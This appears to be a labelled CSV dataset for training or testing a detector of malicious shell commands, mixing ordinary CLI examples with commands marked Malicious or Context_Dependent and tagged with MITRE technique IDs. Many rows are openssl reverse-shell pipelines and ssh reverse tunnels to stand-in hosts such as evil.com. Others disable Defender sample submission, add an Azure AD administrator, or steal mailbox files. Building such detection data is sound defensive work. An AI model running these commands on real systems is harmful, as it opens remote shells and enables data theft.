command,label,original_label,mitre_id
mkid,Benign,Benign,Benign
most path/to/file +/string,Benign,Benign,Benign
systemctl disable unit --now,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9001,Malicious,Synthetic,Synthetic
ccomps path/to/input1.gv path/to/input2.gv ... > path/to/output.gv,Benign,Benign,Benign
sudo e2fsck -c /dev/sdXN,Benign,Benign,Benign
virsh save domain path/to/state_file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
nvcc path/to/source.cu [-o|--output-file] path/to/executable [-I|--include-path] path/to/includes [-L|--library-path] path/to/library [-l|--library] library_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
jj git init --colocate,Benign,Benign,Benign
qm start 100,Benign,Benign,Benign
rpk group describe group_name,Benign,Benign,Benign
tracert /d IP,Benign,Benign,Benign
find MyApp.app -name Headers -type d -delete,Benign,Benign,Benign
ssh -L 8080:localhost:8080 jenkins@internal.corp,Context_Dependent,Synthetic,Synthetic
"find ""$dir"" -mindepth 1 -type f",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
magick path/to/input_image.png -define jpeg:extent=512kb path/to/output_image.jpg,Benign,Benign,Benign
sdiff [-i|--ignore-case] path/to/file1 path/to/file2,Benign,Benign,Benign
gnome-calculator --solve 2^5 * 2 + 5,Benign,Benign,Benign
pstree -s $$,Context_Dependent,Benign,Benign
bluetoothctl pair mac_address,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
parallel convert {} {.}.png ::: *.jpg,Benign,Benign,Benign
npm owner add username package_name,Benign,Benign,Benign
sed 'x;G;1!h;s/\n/ /g;$!d',Benign,Benign,Benign
mamba list,Benign,Benign,Benign
kexec [-l|--load] path/to/kernel --initrd=path/to/initrd --command-line=arguments,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
sudo pvdisplay /dev/sdXY,Benign,Benign,Benign
"zmap [-n|--max-targets] 1000 SUBNETS [-p|--target-ports] port1,port2-port3",Context_Dependent,Benign,Benign
ssh -R 4444:localhost:1433 support@10.10.10.10,Context_Dependent,Synthetic,Synthetic
"Set-ItemProperty ""HKLM:\software\microsoft\windows defender\spynet"" -Name ""SubmitSamplesConsent"" -Value 0",Malicious,Malicious,T1562
carp -b path/to/file.carp,Benign,Benign,Benign
darkhttpd path/to/docroot --addr ip_address,Benign,Benign,Benign
ssh -R 4444:localhost:22 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:8080 user@192.168.1.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
goreload [-b|--bin] path/to/binary path/to/file.go,Benign,Benign,Benign
gunzip -l file.zip,Benign,Benign,Benign
shotcut path/to/file1 path/to/file2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
fastlane run clear_derived_data,Benign,Benign,Benign
find /tmp/* -atime +10 -exec rm -f {} \;,Benign,Benign,Benign
kustomize edit set image busybox=alpine:3.6,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
laydown doing item,Benign,Benign,Benign
npm [rb|rebuild] --prefix path/to/dir package,Benign,Benign,Benign
ssh -R 8080:localhost:80 root@10.10.10.10,Context_Dependent,Synthetic,Synthetic
texliveonfly source.tex,Benign,Benign,Benign
dysk [-f|--filter] 'disk = HDD',Benign,Benign,Benign
"mkisofs -o filename.iso -V ""label_name"" path/to/source_directory",Benign,Benign,Benign
sort -m <(zcat $part0 | sort) <(zcat $part1 | sort),Benign,Benign,Benign
ifconfig eth0 down,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
"tree -if | grep \\.[ch]\\b | xargs -n 1 grep -H ""#include""",Benign,Benign,Benign
"whiptail --title ""title"" --yesno ""message"" height_in_chars width_in_chars",Benign,Benign,Benign
ls -d !(*@(.c|.h)),Benign,Benign,Benign
fping [-q|--quiet] [-a|--alive] [-g|--generate] 192.168.1.1 192.168.1.254,Benign,Benign,Benign
scriptreplay path/to/timingfile path/to/typescript 0.5,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:80,Malicious,Synthetic,Synthetic
prlimit,Benign,Benign,Benign
find / -nouser,Context_Dependent,Benign,Benign
godot [-p|--project-manager],Benign,Benign,Benign
ssh -R 8080:localhost:80 audit@10.20.30.40,Context_Dependent,Synthetic,Synthetic
bioradtopgm path/to/file.pic,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:995 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
input | carbon-now --to-clipboard,Benign,Benign,Benign
notmuch setup,Benign,Benign,Benign
pg_archivecleanup [-x|--strip-extension] extension path/to/archive path/to/walfile,Benign,Benign,Benign
autopkgtest -- chroot path/to/new_root,Benign,Benign,Benign
clamdscan --infected,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8443,Malicious,Synthetic,Synthetic
pm list packages -3,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
find . -regex '.+\.php',Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
"find . -type f -name \* | grep ""tgt/etc/*""",Benign,Benign,Benign
jj [desc|describe],Benign,Benign,Benign
ssh -R 4444:localhost:22 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
/path/to/ld.so /bin/sh,Malicious,Malicious,T1059
ssh -R 4444:localhost:22 deploy@files.company.local,Context_Dependent,Synthetic,Synthetic
query session,Benign,Benign,Benign
DEL path/to/file,Benign,Benign,Benign
"find foo bar -name ""*.java""",Benign,Benign,Benign
find . -type f -not -path '*/\.*',Benign,Benign,Benign
ssh localhost /bin/sh,Malicious,Malicious,T1059
mkcert -uninstall,Benign,Benign,Benign
dotnet tool restore,Benign,Benign,Benign
"tuckr add \* -e program1,program2",Benign,Benign,Benign
systemd-dissect path/to/image.raw,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
ffplay -nodisp path/to/file,Benign,Benign,Benign
.pth,Malicious,Malicious,T1546
NtWriteVirtualMemory,Malicious,Malicious,T1055
less path/to/source_file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
urpmq --list-media --list-url,Benign,Benign,Benign
nvm ls-remote,Benign,Benign,Benign
pcxtoppm path/to/file.pcx > path/to/file.ppm,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
chkrootkit -n,Benign,Benign,Benign
crond -s,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));',Malicious,Malicious,T1140
termusic --help,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
streamlink --hls-live-restart example.com/stream best,Benign,Benign,Benign
esxcli network diag ping,Context_Dependent,Malicious,T1018
gst-launch-1.0 videotestsrc ! pipewiresink mode=provide,Benign,Benign,Benign
systemd-path --version,Benign,Benign,Benign
kube-capacity [-u|--util],Benign,Benign,Benign
pueue enqueue task_id,Benign,Benign,Benign
cs java --available,Benign,Benign,Benign
ssh -R 8080:localhost:8443 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:1433 user@10.10.10.25,Context_Dependent,Synthetic,Synthetic
"find /tmp -type f -name "".*""",Benign,Benign,Benign
kiterunner scan path/to/hosts.txt [-w|--kitebuilder-list] path/to/wordlist.kite,Benign,Benign,Benign
unflatten path/to/input1.gv path/to/input2.gv ... > path/to/output.gv,Benign,Benign,Benign
cpulimit [-p|--pid] 1234 [-l|--limit] 25%,Benign,Benign,Benign
var-dump-server --format=html > path/to/file.html,Benign,Benign,Benign
find /home/david -name 'index*',Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:3389,Malicious,Synthetic,Synthetic
head,Malicious,Malicious,T1140
"khal new -a personal 2020-09-08 18:00 18:30 ""Dentist appointment""",Benign,Benign,Benign
sudo homectl with username -- command command_arguments,Benign,Benign,Benign
pkcon search package,Benign,Benign,Benign
where command,Benign,Benign,Benign
goku --help,Benign,Benign,Benign
"find . -depth -name ""blabla*"" -type f | xargs rm -f",Benign,Benign,Benign
ssh -L 8080:localhost:80 user@10.10.10.25,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:22 jenkins@172.16.5.20,Context_Dependent,Synthetic,Synthetic
"find . -type f -name ""*.txt"" -exec sed 's/TZ/MALAWI/g' {} \;",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
op read secret_reference,Benign,Benign,Benign
ssh -R 4444:localhost:8443 admin@files.company.local,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:3306 user@10.0.0.8,Context_Dependent,Synthetic,Synthetic
aws command help,Benign,Benign,Benign
"oxipng ""*.png""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
chfn [-h|--home-phone] new_home_telephone_number username,Benign,Benign,Benign
ld.so,Malicious,Malicious,T1574
iwlist wireless_interface scan,Benign,Benign,Benign
poetry remove package --dry-run,Benign,Benign,Benign
ssh -R 4444:localhost:9090 backup@files.company.local,Context_Dependent,Synthetic,Synthetic
ls -tQ | tail -n+4 | xargs rm,Benign,Benign,Benign
debman -p package command,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:993 deploy@evil.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
beanstalkd,Benign,Benign,Benign
pulseaudio-ctl mute,Benign,Benign,Benign
nautilus --quit,Benign,Benign,Benign
ssh -R 4444:localhost:443 audit@support.internal,Context_Dependent,Synthetic,Synthetic
find /home/ -name monfichier,Context_Dependent,Benign,Benign
sudo xdp-filter load [-p|--policy] allow [-m|--mode] skb network_interface,Benign,Benign,Benign
jps,Benign,Benign,Benign
"screen -list | awk '{print $1}' | grep -q ""$1$""",Benign,Benign,Benign
ssh -R 8080:localhost:8888 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
ipaggcreate --address-pairs --bytes path/to/file.pcap,Benign,Benign,Benign
systemctl try-reload-or-restart unit,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9002,Malicious,Synthetic,Synthetic
"Get-ChildItem -Path ""$SitePackages"" | Where-Object { $_.Name -like ""*.pth"" }",Malicious,Malicious,T1546
named -4|-6,Benign,Benign,Benign
ssh -R 8080:localhost:80 operator@172.16.0.25,Context_Dependent,Synthetic,Synthetic
chezmoi re-add path/to/dotfile1 path/to/dotfile2 ...,Benign,Benign,Benign
ssh -R 4444:localhost:993 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
ping host | x ping vis [-m|--heatmap],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:9090 backup@10.0.0.8,Context_Dependent,Synthetic,Synthetic
dpkg-deb [-b|--build] path/to/directory,Benign,Benign,Benign
explorer,Benign,Benign,Benign
ssh -R 4444:localhost:8080 audit@evil.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
uwfmgr file commit drive_letter:\path\to\file,Benign,Benign,Benign
needrestart,Benign,Benign,Benign
abrt-action-analyze-c,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
lazydocker,Benign,Benign,Benign
getmac /?,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
kubectl plugin list --name-only,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
echo '# KEYWORD: shutdown' >> $rc_service_path/$rc_service_file,Malicious,Malicious,T1543
/sbin/auditd -n,Malicious,Malicious,T1036
which_python=`which python || which python3`,Malicious,Malicious,T1560
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"ls -Al | grep ""^d"" | awk -F"" "" '{print $9}'",Benign,Benign,Benign
csvformat [-U|--out-quoting] 0 data.csv,Benign,Benign,Benign
pip install --break-system-packages .,Malicious,Malicious,T1548
vault unseal key-share-x,Benign,Benign,Benign
buku [-w|--write] bookmark_id,Benign,Benign,Benign
lvmdump,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
dokku apps:create app_name,Benign,Benign,Benign
"{if($user.$prop -like ""*password*"")",Malicious,Malicious,T1552
ssh -R 8080:localhost:80 user@192.168.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9090,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 admin@target.com,Context_Dependent,Synthetic,Synthetic
o [-m|-monitor] path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
"printf ""header1,header2\nbar,foo\n"" | column [-t|--table] [-s|--separator] ,",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
pi --bibliography,Benign,Benign,Benign
gh pr merge pr_number --admin,Benign,Benign,Benign
plenv local version,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:6379,Malicious,Synthetic,Synthetic
pamslice [-r|-row] n path/to/image.pam,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:143 postgres@10.10.10.25,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:8888 svcuser@192.168.0.5,Context_Dependent,Synthetic,Synthetic
find /home -perm /a=x,Context_Dependent,Benign,Benign
go mod verify,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
gphoto2 --summary,Benign,Benign,Benign
mpijavac --showme,Benign,Benign,Benign
ssh -R 8080:localhost:80 deploy@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
stl2gts < path/to/file.stl > path/to/file.gts,Benign,Benign,Benign
VBoxManage startvm vm_name|uuid --password path/to/password_file,Benign,Benign,Benign
sc query state= all,Context_Dependent,Malicious,T1007
topgrade [-c|--cleanup],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
AppLauncher.exe {PATH_ABSOLUTE:.exe},Malicious,Malicious,T1127
fscrypt unlock path/to/encrypted_directory,Benign,Benign,Benign
find . -name '*bak' -exec rm -i {} \;,Benign,Benign,Benign
find ~/junk -name 'cart[1-6]' -exec ls -l {} \; 2> /dev/null,Benign,Benign,Benign
papermc start,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:143,Malicious,Synthetic,Synthetic
hardinfo [-r|--generate-report] [-f|--report-format] html > hardinfo.html,Benign,Benign,Benign
ssh -R 4444:localhost:1433 operator@files.company.local,Context_Dependent,Synthetic,Synthetic
wormhole send path/to/file,Benign,Benign,Benign
kerl list releases,Benign,Benign,Benign
ssh -R 4444:localhost:143 user@192.168.1.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:143 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
schroot --chroot chroot command -- command_options,Benign,Benign,Benign
git annex status path/to/file_or_directory,Benign,Benign,Benign
licensor MIT > LICENSE,Benign,Benign,Benign
latex -halt-on-error source.tex,Benign,Benign,Benign
pg_isready,Benign,Benign,Benign
jar tvf path/to/file.jar,Benign,Benign,Benign
ssh -R 4444:localhost:4444 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
apkeep [-a|--app] com.example.application [-d|--download-source] apk-pure|google-play|f-droid|huawei-app-gallery path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:443,Malicious,Synthetic,Synthetic
kubectl auth can-i verb resource [-n|--namespace] namespace,Context_Dependent,Benign,Benign
dfc -c never,Benign,Benign,Benign
find / -type d -print,Context_Dependent,Benign,Benign
/Library/LaunchDaemons/,Malicious,Malicious,T1543
"echo ""Your secret message"" | rage --encrypt --recipient user --output path/to/message.age",Benign,Benign,Benign
pueue restart [-k|--immediately] task_id task_id,Benign,Benign,Benign
ssh -R 4444:localhost:110 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
git reset,Benign,Benign,Benign
file `which python`,Benign,Benign,Benign
tspin path/to/file.log [-p|--print],Benign,Benign,Benign
systemctl try-restart unit1 unit2 ...,Benign,Benign,Benign
"awk '{printf ""%s|"", $0} END {printf ""\n""}' inputfile",Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
w | awk '{print $1}',Context_Dependent,Benign,Benign
chmod 644 `find -type f`,Benign,Benign,Benign
pylint --rcfile path/to/pylintrc path/to/file.py,Benign,Benign,Benign
ssh -L 8080:localhost:80 postgres@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
smbserver.py -hashes LMHASH:NTHASH sharename path/to/share,Benign,Benign,Benign
ssh -R 4444:localhost:1433 admin@files.company.local,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
Invoke-ATHHTMLApplication -HTAFilePath $hta_file_path -ScriptEngine $script_engine -SimulateUserDoubleClick,Malicious,Malicious,T1218
"Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""$target_user""",Malicious,Malicious,T1098
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
gcrane auth login registry [-u|--username] user [-p|--password] password,Benign,Benign,Benign
"find ""/path/to/pdfs/"" -type f -name ""$1*.pdf"" -exec stat -f ""%10Dm %SN"" {}\; | sort -k1,1n -k2,2",Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:8443 backup@update.bad,Context_Dependent,Synthetic,Synthetic
icacls.exe,Malicious,Malicious,T1222
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:993 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
"cmd /c ""$env:userprofile\Downloads\T1036\README.cmd"" >$null 2>$null",Malicious,Malicious,T1036
"textutil -cat html -title ""Several Files"" -output path/to/index.html *.rtf",Benign,Benign,Benign
yabai -m config window_shadow off,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
find httpdocs -type d,Benign,Benign,Benign
ssh -R 8080:localhost:80 deploy@update.bad,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:80 deploy@10.0.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
phpbu --limit=backup_task_name,Benign,Benign,Benign
slapt-src [-w|--show] slackbuild_name,Benign,Benign,Benign
grpcurl grpc.server.com:443 list,Benign,Benign,Benign
limine-enroll-config path/to/BOOTX64.EFI blake2b_hash,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
tree -L 2 -fi,Benign,Benign,Benign
New-Item -ItemType Directory -Path $storageAccountOutputPath,Malicious,Malicious,T1530
mplayer path/to/file1 path/to/file2 ...,Benign,Benign,Benign
exiftool -description -W /path/to/output-file --filename /path/to/input-file,Malicious,Malicious,T1222
rarcrack --type rar|zip|7z path/to/file.zip,Benign,Benign,Benign
ots new --region regional_server_id,Benign,Benign,Benign
kopia repository create filesystem --path path/to/local_repository,Benign,Benign,Benign
tar cvf - `find . -mtime -1 -type f -print` > $archive.tar,Benign,Benign,Benign
pdfgrep [-H|--with-filename] [-n|--page-number] pattern file.pdf,Benign,Benign,Benign
"wmic /node:<ip> process call create ""cmd /c copy c:\Users\<username>\<path>\backup.pst c:\windows\temp\backup.pst"" copy ""i:\<path>\<username>\My Documents\<filename>.pst""",Malicious,Malicious,T1114
nagios3 -s,Benign,Benign,Benign
pio pkg unpublish package@version,Benign,Benign,Benign
find . \( -size +700k -and -size -1000k \) -exec du -Hs {} \; 2>/dev/null,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
route print,Context_Dependent,Malicious,T1016
nix develop nixpkgs#pkg,Benign,Benign,Benign
ssh -L 8080:localhost:80 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
strip [-d|--strip-debug] path/to/file.o,Benign,Benign,Benign
"find downloads -iname ""*.gif""",Benign,Benign,Benign
echo echo Hello world | zsh,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
cupsctl --remote-admin|--no-remote-admin,Benign,Benign,Benign
"HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe",Malicious,Malicious,T1547
